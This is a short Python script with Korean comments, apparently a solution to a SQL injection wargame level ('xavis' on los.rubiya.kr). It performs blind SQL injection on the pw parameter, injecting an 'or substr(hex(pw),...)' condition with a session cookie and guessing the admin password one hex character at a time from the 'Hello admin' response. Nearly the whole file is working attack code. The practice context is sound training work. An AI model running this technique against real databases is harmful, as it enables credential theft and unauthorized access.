#!/usr/bin/python
#-*-coding:utf-8  -*-


# Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests

# c6b0 / c655 / ad73

password=""
heex = "0123456789abcdef"

for j in range(1,25):            
	for i in heex:  
		print(i)       
		url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or substr(hex(pw),"+str(j)+",1)="+"'"+str(i)+"' %23"
		r = requests.post(url,cookies=(dict(PHPSESSID="hrkj53uub3keuv6qmu898csv46"))) # 자신의 Session ID를 넣어야함.
		if 'Hello admin' in r.text:    
			password = password + str(i)
			print "[+]Password : " + password
			break

